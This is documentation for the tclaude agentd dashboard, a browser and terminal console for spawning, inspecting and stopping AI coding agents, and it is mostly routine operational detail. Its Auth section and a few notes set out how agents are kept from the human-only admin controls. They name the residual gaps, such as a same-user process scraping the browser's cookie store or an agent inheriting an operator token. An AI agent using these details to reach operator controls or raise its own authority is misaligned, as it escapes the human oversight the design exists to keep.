# Agent Dashboard 📊

The **agentd dashboard** is a browser UI for inspecting and operating the
agent-coordination system — groups, agents, permissions, scheduled jobs, and
time-bounded elevations — without dropping to the CLI for every action. It is
served by `tclaude agentd` on its loopback port and is **human-only**.

It used to be a read-only viewer; it is now a full operations console. Almost
everything you can do with `tclaude agent` on the command line you can also do
here — spawn agents, edit group membership, wake/stop sessions, schedule cron
jobs, grant elevations.

## Opening the dashboard

The daemon (`tclaude agentd serve`) must be running. Then, as the human:

```bash
tclaude agent dashboard          # open in your default browser
tclaude agent dashboard --print  # print the one-shot URL instead of opening
tclaude agent ui                 # 'ui' is an alias for 'dashboard'
```

Other entry points:

- **System tray** — `agentd serve` adds a tray icon on hosts that support one;
  its **Open dashboard** item opens the dashboard with no terminal round-trip.
  The icon's **colour** is a glanceable summary of the daemon's state, in
  priority order:
  - **blinking green↔red** — at least one agent is blocked on you: a Claude
    Code permission prompt / elicitation dialog (`awaiting_*`), a turn that
    ended in error, or a pending `--ask-human` approval popup. Act now.
  - **orange** — a sudo grant is currently active somewhere (a passive
    "an elevation window is open" reminder).
  - **yellow** — every online agent is idle (the quiet state — nothing is
    working and nothing needs you).
  - **green** — at least one agent is working, or there are no online agents
    (the default).

  The same colours match the per-agent status dots/pills on the dashboard.
  Hover the tray icon for the count behind whichever colour is showing.
  Pass `--no-tray` (or set `agent.disable_tray: true` in
  `~/.tclaude/data/config.json`, or tick **System tray → hide** in the Config tab)
  to run the daemon without the tray icon.
- **On startup** — `tclaude agentd serve --auto-launch-dashboard` (or
  `agent.auto_launch_dashboard: true` in `~/.tclaude/data/config.json`) pops the
  dashboard automatically when the daemon comes up. Off by default — a fresh
  daemon doesn't open a browser tab uninvited.

The `--print` URL carries a single-use token that expires in ~60 seconds, so
use it immediately.

## Terminal UI (`--tui`)

`tclaude agentd serve --tui` runs a small text UI in the daemon's own terminal.
It covers the moves the dashboard is most often opened for — see which agents
exist, start a new one, go look at one, take one offline, retire one that is
done — and nothing else:

```
enter  go to the selected row's tmux session — or, on an offline agent,
       turn it back on
n      start a new agent (group, spawn profile, name, directory, worktree,
       harness, startup brief)
s      start a plain interactive shell session (directory, label) and go
       to it
delete move the selected row one step toward removal (it asks first):
       an agent goes online → offline → retired; a session is ended
f      filter the list down to the active agents (toggle)
r      refresh now (the list also polls every 2s)
?      key help
q      quit — this SHUTS DOWN the daemon (it asks first)
```

The key help is longer than most terminals, so it scrolls: **↑/↓**, **PgUp**/
**PgDn** and **Home**/**End** (or **k**/**j**, **^B**/**^F**, **g**/**G**) move
through it, and any other key closes it as before. A terminal tall enough for
the whole text says so instead of showing the scroll keys.

### Two kinds of row

The list holds agents and, below them, this host's plain **sessions** — the
ones **s** starts here, and any `tclaude session new` you ran from another
terminal. A session is not an agent: no conversation the agent API describes,
no group, no permissions. It is marked as such in the **GROUP** column, which
reads `(session)` where an agent shows the groups it is in:

```
AGENT           GROUP      STATUS   HARNESS  DIRECTORY
review-bot      tclaude    working  claude   ~/src/tclaude
tui-work        tclaude    idle     claude   ~/src/tclaude
shell-a1b2      (session)  running  shell    ~/src
scratch         (session)  idle     claude   ~/tmp/scratch
```

The name is the tmux handle, so it is also what
`tclaude session attach <handle>` takes. **enter** on one of these rows hands
this terminal to its pane, exactly as it does on a live agent's row.

Only **live** sessions are listed — the ones `tclaude session ls` shows without
`-a`. An exited one has no pane to go to and no resume verb behind it (a
session is not a conversation), so it would be a row whose only possible answer
to **enter** is "there is nothing there".

One pane is one row. A pane that belongs to any generation of an agent's
conversation is the agent listing's, never re-listed here; so is an agent
launch — a spawn, a reincarnate or a clone — whose conversation has not been
linked yet, so a launch does not flash past as a session on its way into the
roster. Where two rows claim one live tmux name, which happens when a
directory-derived name is reused after its first session died, only the row
that owns the pane is shown. And when you started `agentd serve --tui` from
inside a tclaude session yourself, that session is left out: **enter** on it
would go where you already are, and **delete** would take this terminal —
and the daemon — down with it.

The **f** filter is about agents that have gone offline and leaves session rows
alone.

Sessions are counted separately in the summary line
(`2 agents (1 online) • 3 groups • 2 sessions`). They are the operator's own
host state — their shells, their working directories — so the daemon shows them
to an operator console on its own host only: an agent-class console (see the
identity note below) and a standalone `tclaude agent tui-dashboard` both see
agents alone. They are also the one thing in the console that does not travel
over the daemon's `/v1` API, for the same reason attaching does not: a session
has nothing for the agent API to describe.

**delete** on a session row ends it. There is no ladder to walk — nothing to
park offline, nothing to retire — so the single step is `tmux kill-session`:
whatever is running in that pane stops, with no graceful exit asked for and no
way to start it again afterwards. It asks first, like every other lifecycle
key. The session row itself is left for the daemon's own reaper to mark
`exited`, exactly as when you type `exit` in that shell yourself.

**delete** on an agent row moves it one step toward removal. On an online agent
it is the console's graceful `tclaude agent stop`: the session is asked to exit,
leaving the agent offline and ready for **enter** to resume it. On an already
offline agent it is `tclaude agent retire`: the agent leaves its groups and
loses its permission and sudo grants. The conversation stays on disk and any
worktree is left alone — the console never deletes an operator's work, so a
worktree you no longer want goes through the CLI or the dashboard, which probe
it first. Both actions are confirmed before anything happens, and the
confirmation acts on the agent it names even if the listing re-sorted under the
cursor in the meantime.

**enter** on a live agent does what it does in `tclaude session watch` — it
puts you on that agent's pane. When agentd itself runs inside tmux it uses
`switch-client`, so the console stays live in its own window and tmux's own
keys bring you back; outside tmux it attaches, and the console repaints when
you detach with `ctrl-b d`. Only an operator console can do this (see the
identity note below).

**enter** on an *offline* agent turns it back on instead — the console's
`tclaude agent resume`, and the same move the dashboard's grey status dot
makes. It relaunches the agent in the directory and conversation it was last
running, so it asks nothing first; the listing shows it online again and a
second **enter** goes to its new pane. Unlike attaching, this is not
statically operator-only: it goes through the daemon's resume verb, which
gates the caller itself. What the console never does is recreate a launch
directory that has been deleted since — that comes back as
`error:missing_cwd` naming the path, and recovering it is a CLI or dashboard
move (`tclaude agent resume --recreate-dir`).

A spawn that lands goes straight to the new agent's pane — the same handover
**enter** performs on its row, so starting an agent leaves you in front of it.
Only an operator console does this, and an agent that has no pane yet (a Codex
spawn held behind a startup gate) simply appears in the list instead; detaching
brings you back to the console with the listing refreshed.

**n** opens the spawn form. Its **Profile** picker lists the daemon's saved
[spawn profiles](agent.md) (`tclaude agent profiles ls`) and sends the one you
land on as the spawn's `--profile`. `(default)` names no profile, which is not
the same as "no profile at all": it hands the choice back to the daemon's own
chain, so the group's default profile and then the global one still apply.
Disabled profiles are left out of the picker — a spawn that names one is
refused, and nothing here can re-enable it.

The **Harness** field opens on `(default)` for the same reason, and leaving it
there is what lets a profile choose the harness: an explicit harness outranks
every profile tier, so a pinned one would quietly overrule the Codex or
opencode profile you just picked.

**Directory** opens on the selected group's own default directory
(`tclaude agent groups set-default-dir`), with a trailing `/` and the cursor at
the end: the common "somewhere under the group's tree" spawn is a subdirectory
name typed onto it, and **tab** completes that name once you start it. Cycling
the group picker moves the directory with it until you type a path of your own
— after that the field is yours and the picker leaves it alone. Clearing it is
still fine: a blank directory is the daemon's own fallback to that same group
default. A group with no default leaves the field blank. The path comes from
the daemon's group listing, which serves it to an operator console only — an
agent-class console gets an empty field.

**tab** on Directory only completes a path you have typed into. On the field
as the form left it — blank, or the group's directory untouched — **tab** stays
plain next-field navigation, so you can always tab through the form; without
that a group directory with exactly one subdirectory would complete straight
into it and quietly move the spawn.

**Worktree** opens on `(none)` — the spawn lands in Directory, as it always
did. Turning it to `create new worktree` adds a **Branch** field and starts the
agent in a git worktree instead: the worktree is cut in the repo Directory is
in, and the agent launches inside it, the same shape as
`tclaude agent spawn --worktree <branch>`. Branch **follows the Name** as you
type it, so naming the agent names its branch; typing in Branch yourself ends
that and the Name picker leaves it alone from then on. A branch that already
has a worktree is *reused* rather than refused — that is how this form picks an
existing worktree, since it has no list to pick one from — and a branch that
does not exist yet is cut from the repo's default branch. An unnamed agent
leaves Branch blank, and enter asks for one rather than inventing a branch name
you never saw.

There is no base-branch choice here, unlike `--worktree-base` and the browser
picker: cutting from somewhere other than the default branch is
`tclaude worktree add <branch> --from-branch <base> --detached` first, and then
naming that branch in the form — which reuses the worktree you just made.

The form stays open while the worktree is made. Whatever goes wrong there — a
directory that is not a repo, a branch name git will not take — comes back on
the fields that produced it, with your brief still typed. If the *spawn* then fails, the worktree is **kept** and
the message names it: the console cannot tell a rejected request from a lost
answer, and removing a directory a session may be starting up in is the one
mistake that costs work — `tclaude worktree rm` removes it once you have
decided. This is operator consoles only: the worktree is created by the daemon
process, on the daemon's host, outside any agent sandbox, so an agent-class
console is shown the field as `(none)` and told why. Unlike directory
completion it does *not* also need the console to be on the daemon's own host —
the daemon cuts the worktree either way — so the standalone terminal dashboard
below gets the field too.

**s** opens the shell form: a plain interactive shell in its own tmux session,
the console's `tclaude session new --shell`. It is a **session, not an agent** —
no conversation, no group, no permissions — so it lands in the listing behind
the form as a `(session)` row rather than beside the agents (see "Two kinds of
row" above); from outside the console, find it with `tclaude session ls` and
`tclaude session attach <handle>`, or in `tclaude session watch`. **Directory**
opens on the directory the console itself was started in, with the same **tab**
contract as the spawn form (it completes a path you have typed into, and stays
next-field navigation on the field as the form left it). **Label** names the
tmux handle and is used verbatim, so it is charset-gated to letters, digits,
`-` and `_` — tmux refuses `.` and `:` in a session name outright, and the
label also reaches tmux's `set-titles-string`, which is a format string. A
rejected label keeps the form open on the field; blank generates a handle
instead. Enter starts it and hands you the pane, the
same handover **enter** makes on an agent's row. Like attaching, this is
operator consoles only, and only on the daemon's own host — see the identity
note below.

### The usage line

The bottom of the list view carries a status line in the shape of [Claude
Code's own](status-bar.md): the account's rolling subscription limits, each as
a bar, a percentage and the time until it resets, plus month-to-date API spend
when there is any.

```
usage  5h ███░░░░░ 42% (3h41m) • 7d █░░░░░░░ 18% (2d9h) • api $12.34 mtd ($0.42 today)
```

The figures are the same ones the web dashboard's top bar shows and come from
the same place — the cached reading Claude Code's statusline callback leaves in
SQLite, plus the optional Anthropic usage poll (`usage.poll_anthropic_api`). The
console never calls the API itself; it re-reads that cache every 30 seconds, so
the line can trail a fresh session's first turn by up to half a minute — and it
survives an idle spell rather than collapsing to `n/a` overnight.

When a Codex account also has recent figures, both are named
(`claude 5h … • codex 5h …`). A narrow terminal drops whole segments from the
right rather than wrapping, so the line is never more than one row; below about
thirty columns not even the first segment fits and the line is dropped
altogether. `usage  n/a` means the daemon has no usable reading (an API-billing
account has no rolling windows), and `usage  unavailable` means the console
could not read it at all. A standalone console pointed at a tclaude too old to
have the endpoint shows no line rather than an error, and picks the readout up
by itself if that daemon is upgraded under it.

The readout is the operator's own subscription, so the daemon serves it to an
operator console only; an agent-class console (see the identity note below)
shows no usage line. `tclaude usage` prints the same limits from the CLI.

The rest of the UI is deliberately plain: no theming, no per-terminal palette.
The usage bars are the one place colour carries meaning — green, amber and red
on the same thresholds as the status bar, from the same `tui.color_scheme`
palette as `session watch` — and the cursor row is inverse video. That is the
whole visual system.
Everything it shows or does about *agents* goes through the daemon's own API, so
a spawn started here is the same spawn the CLI and the browser dashboard perform
— same defaults, same validation, same audit entry. The exceptions are the
host-local moves that have no HTTP shape: attaching this terminal to a pane, and
everything to do with plain sessions — starting one, listing them, going to one,
ending one. All of them are gated on the console being the operator instead.
The spawn form's worktree step is not one of them: it is an ordinary request the
daemon serves, on a route mounted for the consoles only (never on the socket mux
agents reach, exactly as the browser's own worktree picker is dashboard-only),
and refused for a console the daemon does not classify as the human.

### With or without the web dashboard

`--tui` on its own is a terminal-only daemon: no loopback dashboard listener is
started. Add any of `--dashboard-port`, `--dashboard-bind` or
`--auto-launch-dashboard` and you get **both** surfaces over the same daemon —
the text UI in your terminal and the web dashboard in the browser, showing the
same agents. The console names the dashboard's URL in its header when one is
running, and on an operator console that URL is ready to open: like the
`--print` one it carries a single-use init token, so the browser lands in the
dashboard already signed in instead of on its sign-in page. The console
replaces the link as it ages, so open the one on screen rather than a copy you
kept — and if the browser says the link was already used, come back for the
next one.

The token is only ever put on screen for a console the daemon classifies as the
operator. A console that is [classified as an agent](#output-under---tui) — and
so can read its own pane — gets the plain URL and no token, as does a console
started with `--no-print-human-token`, which says this terminal's output is
scraped or logged. Sign in with the operator token in those cases.

```bash
tclaude agentd serve --tui                        # terminal UI only
tclaude agentd serve --tui --auto-launch-dashboard # both, browser opened for you
tclaude agentd serve --tui --dashboard-port 8321   # both, dashboard on a fixed port
```

The theme flags (`--slop`, `--wizard`) work as always — they re-skin the
browser dashboard and never touch the terminal UI, which has no theming at all.
On their own they do not start a listener.

### Output under `--tui`

The console owns the terminal, so `--tui` keeps stdout clear of the usual
startup narration — no socket paths, no dashboard URL, no selected terminal.
Those events still go to `~/.tclaude/data/output.log` (the dashboard's **Logs**
tab reads the same file), and real failures still go to stderr.

**Schema migrations are the exception** and still print. They run before the UI
starts, a first run can spend a while in them, and a silent multi-minute
upgrade is indistinguishable from a hang.

The one thing you do need from startup — the **operator token**, for signing in
to the web dashboard or exporting to a CLI in another window — is therefore
shown *inside* the UI. It appears at the top on startup, disappears on your
first keystroke, and `?` brings it back for as long as the daemon runs.
`--no-print-human-token` suppresses it there as everywhere else.

With **no** dashboard listener (a bare `--tui`), two things are worth knowing:

- `tclaude agent dashboard` and the tray's **Open dashboard** have nothing to
  open, and any `agent.auto_launch_dashboard` config setting is inert.
- An agent's `--ask-human` approval request has no surface to appear on and
  fails closed (denied). Grant access with `tclaude agent permissions grant`
  instead. This holds even if [remote access](remote-access.md) is enabled:
  approvals are built around the loopback URL. The remote listener itself is
  unaffected by `--tui` — it is its own explicit opt-in, so a daemon with
  `remote_access.enabled` still serves the dashboard over it.

Either way, quitting the UI stops the daemon — `agentd serve` is a foreground
process and the UI is its face.

If agentd itself was started from inside a harness pane, the console is
classified as that agent (the daemon's ordinary rule: a harness ancestor beats
an operator token, so an agent cannot promote itself with an inherited
`TCLAUDE_HUMAN_TOKEN`). The UI says so in a note under its header; start the
daemon from a plain shell to get an operator console.

### The tmux server under `--tui` (`--own-tmux-server`)

By default the `-L tclaude` tmux server's lifetime has nothing to do with the
daemon's: tmux starts one implicitly the first time something needs it, and
agent panes outlive the daemon that spawned them.

```bash
tclaude agentd serve --tui --own-tmux-server
```

ties the two together for as long as the console runs — but only for a server
the console started itself. At startup the daemon looks for one:

- **Nothing running.** It starts an empty server and turns `exit-empty` off, so
  the server stays up while there are no agents on it instead of appearing and
  disappearing underneath the console. On exit the daemon runs `kill-server` —
  but **only if the server is still empty**. `exit-empty off` outlives the
  console, so an empty server would otherwise linger forever with nothing to
  end it; a server that has picked up sessions is left running instead, because
  by then the console is gone and the agents on it would be killed with no
  chance to object. Either way the daemon prints which of the two it did on the
  way out.
- **A server is already up.** It belongs to whoever started it — an earlier
  daemon, a `tclaude session new` from a plain shell, your own tmux — so the
  console leaves it exactly as it found it. Its `exit-empty` is not changed, and
  quitting the console does not kill it or its sessions.

The flag needs the console: without `--tui` there is no daemon-lifetime to tie a
server to, so it is ignored and startup says so.

When the console owns the server, its quit confirmation says so
(`Quit + shut down agentd (and tmux if empty)?`) instead of the plain wording.

"Empty" means no session with anything still running in it. The check reads
every pane on the server (`list-panes -a`) and counts a session as live when any
of its panes is, so a session whose harness pane has exited while a second window
still runs something keeps the server up. A session left behind as a
retained-dead corpse — scrollback from an agent that has already exited, which is
what `remain-on-exit` is for — does not, so the ordinary "agent ran, exited, you
quit" path still ends in a shut-down server.

A server that survives gets its `exit-empty` released back to tmux's default, so
it exits on its own once those last sessions end rather than lingering pinned.

The exit line naming the outcome goes to stdout, after the console has given the
terminal back, so it is on the scrollback you land on. Every outcome says
something — a silent exit would be indistinguishable from a daemon that never
owned a server at all:

```
tmux server shut down: it had no sessions left on it
tmux server left running: 2 sessions still on it (it will exit when they do)
tmux server left running: could not check whether it still has sessions
tmux server left running: could not confirm it is the one this daemon started
tmux server left running: it is not the one this daemon started
tmux server was already gone; nothing to shut down
tmux server could not be shut down: <error>
```

Ownership is only ever claimed on a definite answer. If the check cannot tell
whether a server is running — no tmux on `PATH`, a tmux too old for the `-N`
probe flag, a permission error — the console starts nothing, changes nothing,
and kills nothing; tmux goes back to starting a server implicitly the first time
something needs one.

Much the same holds on the way out. A server the console cannot re-verify at
exit is left running rather than killed on a guess, and so is one whose pid no
longer answers as the pid it started — that server died and something else took
the socket, so it is not inspected or killed at all. A server whose pane listing
itself fails is left running for the same reason: an answer that could not be
read is not permission to kill — which is why the check does not go through the
dashboard's ordinary session read, whose documented semantics turn any failed
listing into "nothing is alive". The one exception is a console that could
not read a pid for its own server at startup: the check *before* the start had
already said no server was running, so whatever answers at exit is what this run
put there, and it is killed if empty. All of these are logged to `output.log`.

An [external tmux runtime](sandboxing.md) is refused the same way: when
`--resource-delegation-dir` (or its config/environment equivalent) points the
server at a separate, longer-lived systemd unit, the flag neither starts nor
kills it. That server is somebody else's, and its panes are meant to outlive
agentd.

So on a host where the tmux server survives your daemons, the flag changes
nothing about their lifetime; it is on a clean host that the console's server
comes and goes with it.

One consequence worth knowing: `exit-empty off` outlives the process that set
it. If an owning daemon is killed outright — `SIGKILL`, an OOM kill — its
teardown never runs, so it never releases the option, and the empty server it
started stays up indefinitely instead of exiting on its own. The next `--tui`
run finds it and, by the rule above, treats it as somebody else's. Clear it
with:

```bash
tmux -L tclaude kill-server   # only when you know nothing is running on it
```

The standalone terminal dashboard below does none of this. It is an HTTP client
of somebody else's daemon, so quitting it stops nothing.

### Standalone / remote terminal dashboard

The same terminal UI can run as a separate HTTP client:

```bash
# On the agentd host: give the dashboard a stable network endpoint.
tclaude agentd serve --dashboard-port 8321 --dashboard-bind 0.0.0.0

# On this or another machine: use the operator token from agentd's banner.
export TCLAUDE_HUMAN_TOKEN=tclo_...
tclaude agent tui-dashboard --connect-to=agent-host:8321

# A full URL is also accepted (including an HTTPS reverse-proxy prefix).
tclaude agent tui-dashboard --connect-to=https://agents.example.com/tclaude

# When this machine's automatically detected token belongs to a different,
# local agentd, override it explicitly:
tclaude agent tui-dashboard --connect-to=agent-host:8321 \
  --operator-token=tclo_...

# Or read the remote daemon's persisted token through your existing SSH setup:
tclaude agent tui-dashboard --connect-to=agent-host:8321 \
  --remote-operator-token=operator@agent-host:/home/operator/.tclaude/data/operator_token
```

A bare `host[:port]` means HTTP; a URL may use HTTP or HTTPS. The operator
token is a bearer credential with full human authority, so do not send it over
an untrusted network. Prefer HTTPS or a trusted VPN/tunnel when the listener is
not confined to the local machine.

The terminal model talks through a small Go API interface with separate
in-process and HTTP implementations. Listing, spawning, starting offline
agents, retiring, and attaching are available on both transports. **Enter** on
a live remote agent temporarily gives the local terminal to the same
authenticated PTY/WebSocket bridge used by the web dashboard; **Ctrl-] D**
closes only that remote stream and returns to the terminal dashboard, including
when the dashboard itself runs inside a local tmux. Because `Ctrl-]` is the
remote stream's escape prefix, press **Ctrl-] Ctrl-]** to send one literal
`Ctrl-]` to the remote application. The remote tmux client does not displace an
operator already viewing that session elsewhere. Daemon-host path completion
remains unavailable because paths must be completed on the machine where the
terminal UI is running. Quitting a remote console exits only that client;
agentd and its agents keep running.

Token resolution is explicit-first: `--operator-token` (literal value), then
`--remote-operator-token` (an SSH source in
`user@host:/absolute/path` or `user@host/absolute/path` form), then
`TCLAUDE_HUMAN_TOKEN` / the normal local persisted-token lookup. The two flags
are mutually exclusive. A literal command-line token may be retained in shell
history or exposed in a process listing, so prefer the environment or the SSH
source when that matters. The SSH form runs the local `ssh` client and therefore
uses the operator's normal SSH config, agent, and host verification.

The remote client polls every two seconds and treats connection failures as
transient. It keeps the current listing visible while agentd is down and
automatically repopulates it when the same address returns. The first request
authenticates with `TCLAUDE_HUMAN_TOKEN` (or the same persisted-token fallback
ordinary human CLI commands use) and receives the dashboard session cookie.
That cookie uses the web dashboard's clean-restart grace/rotation path, so a
normal agentd restart reconnects without asking for a new token. Persist the
operator token (`agent.persist_operator_token` or
`--persist-operator-token`) as well if reconnecting after an unclean stop must
work, because an ungraceful exit cannot save the previous dashboard session.

The server exposes only the nine versioned JSON operations and one terminal
WebSocket this TUI uses under `/api/tui/`; it does not publish agentd's entire
Unix-socket API on the dashboard listener. One of the nine — the spawn form's
worktree step — goes the other way too: it exists on the console surfaces only
and is not part of the Unix-socket API at all.

## Fixed loopback port

By default the dashboard (and the approval popup it shares a listener with)
binds a **random** free loopback port each time `agentd serve` starts. To pin a
**fixed** port instead — for a bookmarkable URL, a reverse proxy, or a firewall
rule — pass `tclaude agentd serve --dashboard-port <port>`, or set
`agent.dashboard_port` in `~/.tclaude/data/config.json` (also editable from the
**Config** tab). Resolution order is flag > config > random.

Binding is strict: if the configured port is already in use (or out of range),
`agentd serve` **fails to start** with an error rather than silently falling
back to a random port — a silent fallback would break the bookmark / proxy /
rule the fixed port was set up for. The port is loopback-only and stays
human-gated (token + cookie) either way.

## Auth

The dashboard's `/api/*` endpoints perform admin mutations that deliberately
**bypass the per-agent permission system** — they are the human's controls, not
an agent's. To stop an agent that can open a loopback socket from reaching
them, access is gated by an **init-token exchange**:

1. `tclaude agent dashboard` calls the daemon's human-only
   `/v1/dashboard/open` endpoint over the peer-credential-authenticated Unix
   socket. Any caller with a recognized coding-harness ancestor process (i.e. an agent) gets
   a `403`; the human gets a URL carrying a one-shot `init_token`.
2. Opening that URL exchanges the token for an `HttpOnly` / `SameSite=Strict`
   session cookie, then 303-redirects to the bare path so the token never
   lingers in the address bar, browser history, or an access log. The cookie
   name carries a persisted installation namespace, so another loopback
   dashboard on the same host cannot overwrite it merely by using a different
   port (cookies themselves are not port-scoped).
3. Subsequent `/api/*` calls are authorised by that cookie. A bare `GET /` with
   neither a token nor a cookie is refused — the cookie is never handed out for
   free.

Init tokens live in memory, expire after ~60s, and are single-use. Restarting
the daemon drops every pending token; just reopen the dashboard.

**Threat model.** Loopback-only, same-user trust boundary — the same as the
[approval popup](agent.md#ad-hoc-human-approval-ask-human). A same-user
process could still scrape the human browser's on-disk cookie store; that is
the genuine trust floor, far above "make one unauthenticated HTTP request."
The recommended Claude sandbox hardening and Codex `tclaude-agent` profile both
deny direct access to agentd's private state.

## Layout

A single-page app that polls `GET /api/snapshot` every 2 seconds and presents
a tabbed operations surface. Common affordances across the data tabs:

- **Click-to-sort** — column headers toggle ascending/descending.
- **Search box** — per-tab text filter. On Groups it also matches role,
  description, conv-id, and working directory; on Cron it matches the job
  subject and body.
- **Show offline** — the Groups tab has a toggle that hides agents whose
  tmux pane isn't alive, plus a per-group override
  (`inherit → always show → always hide`).
- **Expandable rows** — `<details>` open/closed state persists in
  `localStorage` across polls.
- **Command palette** — the header button or **Ctrl/Cmd-K** opens searchable
  dashboard actions. **Announce to all live agents…** opens a human-authored
  message composer and sends one copy to every active agent whose tmux session
  is live when you submit. Group boundaries do not apply: ungrouped agents are
  included, agents in several groups receive one copy, and offline agents are
  not queued.
- Interactive list edits are generally **optimistic**: the UI applies the
  change locally, fires the API call, and rolls back on failure; the next
  2-second poll reconciles to canonical state.

### Groups

Every group, expandable to its members. Each member row shows the status
dot, role / description, working directory, git branch or
worktree, effective permissions, and an **owner** badge where applicable.

A group's **⚙** menu can mark it as the **directory auto-join default** once
the group has a default working directory. Only one group can hold the mark at
a time. A bare `tclaude` launch uses the marked group to break a tie when
several active groups map to the same canonical directory; otherwise the CLI
reports the ambiguity and points back to this setting.

An amber **!** floating over the start of an agent's name means that agent has
sent one or more unread notifications to the human with
`tclaude agent notify-human`. Hovering it previews the newest one; selecting it
opens the quick reader — a right-hand drawer that pages through that agent's
notifications, previews an attached raster image, downloads the original,
replies, and offers **Open in
Messages ↗** for the full **Messages → Human** view filtered to that agent.
Opening a notification in the reader does **not** mark it read — glancing at a
message never silently clears the mark. Use the reader's **Mark read** action
when you have handled it; sending a reply marks the original read too.

The same amber **!** appears on the **Terminals** tab, on the tab of any open
terminal whose agent has unread notifications, and opens the same quick reader.
A collapsed tab stack carries the mark on its pill while the tab it belongs to
is folded away. Matching amber marks over the top-bar activity bots and a
group's activity bots are non-interactive breadcrumbs: globally they mean some
agent needs attention, and on a group they mean one of its members does. Only
the agent-row and terminal-tab marks are links; marking the notification read
(or replying to it) updates every level on the next dashboard refresh.

The row's harness/model line carries a **sandbox badge** — `🔒` when the OS
sandbox confined the agent, `⚠` for a posture weaker than it looks. It reflects
what actually confined the launch, not which mode was requested, so a Claude
agent sandboxed through your own `settings.json` is badged even though it was
spawned under the default `inherit`. Hovering it shows the compact recorded
summary: `Status`, `Implementation`, `Profile`, the `Cgroup` / `Memory limit` /
`CPU limit` block when the launch carries a per-agent Linux cgroup, zero or more
persisted sandbox-access `Warning` lines, and a click action when the badge
supports a temporary disable or restore. It does not show mode/settings provenance or
infer the effects of a named profile. See
[Reading an agent's sandbox badge](sandbox-hardening.md#reading-an-agents-sandbox-badge).
The optional adjacent **›** is a separate, non-mutating details action. It is
hidden by default; enable `features.recorded_sandbox_details` in the config file
or **Config → Experimental features → Recorded sandbox details** to show it.
It expands only facts frozen on that launch row: the recorded harness sandbox
mode (labelled **Harness sandbox mode** — the harness's own setting, which a
`tclaude-layer` launch stands down while tclaude's wall enforces; the
**Implementation** line above it is who enforces) and its provenance,
applied profile names, the same cgroup budget block, persisted access notices,
and a known partial-fidelity
sentence when the recorded implementation/source pair exactly matches a ruled
producer literal. An unknown unverified pair gets a generic
recorded-as-unverified sentence; the dashboard does not guess from source
substrings or predict current capability. The padlock/warning itself keeps the
compact tooltip and temporary disable/restore action described above.

A successfully live-probed Linux `stacked` launch uses the distinct `🔒²`
glyph. Its compact tooltip reports `Status: ON` and identifies the implementation
as `CC+TClaude` or `Codex+TClaude`. Unknown implementation strings report
`Status: UNKNOWN` and `Implementation: Unknown`; they remain warning badges and
never inherit either lock.

The same line can carry a **refused-telemetry badge** — `🚫`, shown when agentd
has been refusing this agent's brokered hook/status-line callbacks. It matters
because the failure is otherwise silent: the agent keeps working, but nothing it
reports gets written, so **the rest of the row — status, model, cost, context,
directory — is frozen at its last accepted value** and may be badly out of date.
Hover it for the count and how long it has been happening. The usual cause is a
dead session row recorded against the same pid as this agent's pane, which makes
the daemon place the callbacks on the wrong row; the other is an agent
presenting a session id that disagrees with the one its process ancestry
resolves to. Only sandboxed (`tclaude-layer`) agents route their callbacks
through the daemon, so only they can *cause* one — but the badge lands on
whichever row the daemon resolved, and in the pid-reuse case that is the
unrelated (often dead, often unsandboxed) row whose pid was reused.

The badge always names the row **agentd itself resolved** for the caller, never
the session id the refused request claimed — otherwise any wrapped agent could
paint a warning on a peer. That has a consequence worth knowing: because the
resolved row can be a dead session, the badge may land somewhere you are not
looking — on an offline agent you have hidden, or on a conversation that was
never in a group. So a notice above the group list reports the **total**
number of refusals in the window, and how many of them the daemon could not
place on any row at all. It names no agent, because for the unplaceable ones
there is nothing trustworthy to name; the daemon log carries the caller pid.

Group headers carry status-bot counts for their direct members. In a nested
group tree, folding a group rolls every hidden descendant into that header's
bot counts; unfolding it moves descendant activity back down to the visible
child headers. Agents enrolled in more than one group within the folded subtree
are counted once in the rollup.

The **status dot** is the agent's power control: click an online (green)
dot to turn the agent off — a confirm offers **Soft exit** (inject
`/exit`) or **Force kill** (`tmux kill-session`) — and click an offline
(grey) dot to resume it. There are no separate per-row wake/shutdown
buttons; the dot does both.

The **state cell** also carries an **activity badge** — `🤖+N`, shown when
the agent has *N* sub-agents (Task-tool children) still running. It appears
even when the agent's own turn has ended (status `idle` / `main_agent_idle`),
and that is exactly the point: a sub-agent launched in the background
outlives the parent's turn, so the badge flags that an idle-looking agent
is not actually finished. While one is live, a bare `idle` reading is
presented as `idle + work`, consistently with the background-shell case.
Hover the badge for the exact count. The badge is shown
only for a live agent — an offline agent's sub-agents died with its process.
The hook-fed ledger has a conservative staleness timeout for lost stop events;
for Codex sessions, the dashboard additionally replays the rollout's
`sub_agent_activity` events, so an explicitly interrupted child disappears on
the next refresh instead of waiting for that timeout.

Long state details, such as tool names, are ellipsized in the pill so the state
column stays compact. Hover the pill, or focus it with the keyboard or a tap, to
see the complete status and detail.

Alongside it sits a **background-shell badge** — `⚙+N`, shown when the agent
has *N* background shell commands (`Bash` with `run_in_background: true`)
still running. It answers the same question for the other kind of work that
outlives a turn: an agent waiting on a background dev server, test watch, or
build is not finished, and without the badge it renders as plain `idle`.
While at least one is running the state pill also holds at
`main_agent_idle` ("waiting on a background command") rather than settling
to `idle`. Claude Code only; Codex has no equivalent mechanism and never
shows the badge.

Beside it sits a **monitor badge** — `👁+N`, shown when the agent has *N*
[monitors](https://code.claude.com/docs/en/tools-reference#monitor-tool)
still watching. A monitor is Claude Code's third kind of turn-outliving
work: a `Monitor` call tails a log, polls a CI job or PR, or holds a
websocket, and streams each event back into the conversation long after the
turn that started it ended. An agent whose only outstanding work is a
monitor used to render as plain `idle`; it now holds at `main_agent_idle`
just as it does for a background shell. Hover the badge for the count.
Claude Code only, and only where Claude Code itself offers the tool: it is
withheld on Amazon Bedrock, Google Cloud's Agent Platform and Microsoft
Foundry, under `DISABLE_TELEMETRY` or
`CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`, and when the `background-tasks`
context feature is turned off.

> **How the background-shell count stays honest.** Claude Code fires a hook
> when such a shell *launches* (`PostToolUse` for `Bash`, carrying the
> `backgroundTaskId`) but **none when it exits** — so a hook-fed count could
> only ever grow, and would display long-finished "ghost" shells for the
> whole idle window, which is precisely when the badge is read. tclaude
> therefore keeps a ledger, not a counter, and reconciles it against
> reality: when the dashboard renders a live agent, `agentd` enumerates the
> processes running *below* that agent and re-matches each ledger entry's
> recorded command against them. Claude Code exposes no PID for a background
> task anywhere, so the command string is the join key — the wrapper shell it
> launches carries the command inside its own argv. Entries whose process is
> gone are retired immediately; entries still running are re-stamped, so a
> command that legitimately runs for hours never ages out. A `TaskStop`
> removes its task by id, and process (re)starts and exits clear the ledger
> outright (background shells are children of the harness process). Two
